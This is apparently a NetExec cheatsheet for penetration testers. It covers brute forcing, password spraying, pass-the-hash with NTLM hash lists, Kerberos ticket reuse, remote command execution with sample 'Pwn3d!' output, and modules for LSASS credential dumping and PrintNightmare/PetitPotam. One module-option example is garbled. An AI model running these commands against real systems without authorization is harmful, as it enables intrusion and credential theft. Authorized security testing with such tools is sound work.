## NetExec Cheatsheet

### Installation
```
Installing NetExec with pipx
Using pipx to install NetExec is recommended. This allows you to use NetExec and the nxcdb system-wide.
apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec

Open a new shell and you are ready to go:
NetExec
nxcdb
```

### Protocols
```
Available Protocols
smb
ssh
ldap
ftp
wmi
winrm
rdp
vnc
mssql
Not all protocols support the same functionality, be sure to check each protocol's options.
```

### Protocol Options
```
Using Protocol Options
To view a protocols options, run: nxc <protocol> --help
Then use those options: nxc <protocol> <protocol options>
```

### Viewing Available Protocols
```
Running nxc --help will list general options and protocols that are available (Notice the 'protocols' section below):
#~ nxc --help
usage: nxc [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--verbose] [--debug] [--version] {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql} ...

options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --no-progress         Not displaying progress bar during scan
  --verbose             enable verbose output
  --debug               enable debug level information
  --version             Display nxc version

protocols:
  available protocols

  {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql}
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    ldap                own stuff using LDAP
    ftp                 own stuff using FTP
    wmi                 own stuff using WMI
    winrm               own stuff using WINRM
    rdp                 own stuff using RDP
    vnc                 own stuff using VNC
    mssql               own stuff using MSSQL
```

## Target Formatting
```
Every protocol supports targets by CIDR notation(s), IP address(s), IP range(s), hostname(s), a file containing a list of targets or combination of all of the latter:

netexec <protocol> poudlard.wizard
netexec <protocol> 192.168.1.0 192.168.0.2
netexec <protocol> 192.168.1.0/24
netexec <protocol> 192.168.1.0-28 10.0.0.1-67
netexec <protocol> ~/targets.txt
```

## Using Credentials
```
Every protocol supports using credentials in one form or another.
For details on using credentials with a specific protocol, see the appropriate wiki section.
Generally speaking, to use credentials, you can run the following commands:
netexec <protocol> <target(s)> -u username -p password

Special Symbols
When using usernames or passwords that contain special symbols (especially exclaimation points!), wrap them in single quotes to make your shell interpret them as a string:
netexec <protocol> <target(s)> -u username -p 'October2022!'
```

## Using a Credential Set From the Database
```
By specifying a credential ID (or multiple credential IDs) with the -id flag nxc will automatically pull that credential from the back-end database and use it to authenticate (saves a lot of typing):
netexec <protocol> <target(s)> -id <cred ID(s)>
```

## Multi-Domain Environment
```
You can use nxc with mulitple domain environment
netexec <protocol> <target(s)> -p FILE -u password

Where FILE is a file with usernames in this format:
DOMAIN1\user
DOMAIN2\user
```

## Brute Forcing and Password Spraying
```
All protocols support brute-forcing and password spraying. For details on brute-forcing/password spraying with a specific protocol, see the appropriate wiki section.
By specifying a file or multiple values nxc will automatically brute-force logins for all targets using the specified protocol:

netexec <protocol> <target(s)> -u username1 -p password1 password2
netexec <protocol> <target(s)> -u username1 username2 -p password1
netexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
```

## Password Spraying Without Bruteforce
```
Can be usefull for protocols like WinRM and MSSQL. This option avoid the bruteforce when you use files (-u file -p file)
netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce
netexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords --no-bruteforce

By default nxc will exit after a successful login is found.
Using the --continue-on-success flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.

netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce --continue-on-success
```

## Using Kerberos
```
Using Kerberos authentication with NetExec.
nxc does support Kerberos authentication there are two options, directly using a password/hash or using a ticket and using the KRB5CCNAME env name to specify the ticket.

when using the option -k or--use-kcache, you need to specify the same hostname (FQDN) as the one from the kerberos ticket:

$ sudo nxc smb zoro.gold.local -k -u bonclay -p Ocotober2022
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay

Or, using --use-kcache:

$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
$ nxc smb zoro.gold.local --use-kcache
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
$ sudo nxc smb zoro.gold.local --use-kcache -x whoami
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
SMB         zoro.gold.local 445    ZORO             [+] Executed command 
SMB         zoro.gold.local 445    ZORO             gold\administrator

$ export KRB5CCNAME=/home/bonclay/impacket/bonclay.ccache
$ sudo nxc smb zoro.gold.local --use-kcache -x whoami
SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay

Example with LDAP and option --kdcHost
poetry run NetExec ldap poudlard.wizard -k --kdcHost dc01.poudlard.wizard 
SMB poudlard.wizard 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:poudlard.wizard) (signing:True) (SMBv1:False) 
LDAP poudlard.wizard 389 DC01 [+] poudlard.wizard\
```

## Using Modules
```
Viewing Available Modules for a Protocol.
Run nxc <protocol> -L to view available modules for the specified protocol.
For example to view all modules for the SMB protocol:
nxc smb -L
```

## Viewing Module Options
```
Run nxc <protocol> -M <module name> --options to view a modules supported options, e.g:
nxc smb -M lsassy --options
```

## Using Module Options
```
Module options are specified with the -o flag.
All options are specified in the form of KEY=value (msfvenom style)
nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M lsassy -o COMMAND=xxxxxxxxug'
```

## Running Multiple Modules (new!)
```
Simply define all the modules you want, each proceeded by a -m option flag:
nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M spooler -M printnightmare -M shadowcoerce -M petitpotam
```



























